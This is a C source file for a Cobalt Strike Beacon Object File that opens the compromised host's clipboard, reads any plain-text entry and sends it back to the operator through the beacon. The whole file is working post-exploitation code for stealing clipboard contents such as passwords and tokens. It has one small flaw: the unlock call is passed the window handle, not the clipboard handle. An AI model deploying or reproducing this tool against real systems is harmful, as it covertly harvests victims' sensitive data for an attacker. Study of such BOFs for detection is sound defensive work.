#include "beacon.h" // For cobalt api's.
#include <windows.h> // WinApi include.

// Imports, for blue team flag these ;)
DECLSPEC_IMPORT HWND WINAPI KERNEL32$GetConsoleWindow(void);
DECLSPEC_IMPORT BOOL WINAPI USER32$OpenClipboard(HWND);
DECLSPEC_IMPORT BOOL WINAPI USER32$IsClipboardFormatAvailable(UINT);
DECLSPEC_IMPORT HANDLE WINAPI USER32$GetClipboardData(UINT);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$GlobalLock(HGLOBAL);
DECLSPEC_IMPORT BOOL WINAPI USER32$CloseClipboard(void);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GlobalUnlock(HGLOBAL);

void go() { // You can test here with coffloader, I have done so.
	// grab a handle to getconsolewindow.
	HWND owner = KERNEL32$GetConsoleWindow();
	USER32$OpenClipboard(owner); // Openclipboard with that handle.

	if (USER32$IsClipboardFormatAvailable(CF_TEXT)) { // We want this format due to cleartext entries.
		HGLOBAL hclip = USER32$GetClipboardData(CF_TEXT); // GlobalHandle to clipboardData with CF_TEXT to gather cleartext.
		if (hclip != NULL) { // If not equal to 0.
			char* cliptxt = (char*)KERNEL32$GlobalLock(hclip); // cliptext to point twords global lock to lock the memory.
			if (cliptxt != NULL) { // If not equal to 0, Print the entry on the clipboard via our char pointer.
				BeaconPrintf(CALLBACK_OUTPUT, "Entry on the clipboard is: %s", cliptxt);
			}
		}
	}
	// Close clipboard & unlock the memory.
	USER32$CloseClipboard();
	KERNEL32$GlobalUnlock(owner);
}
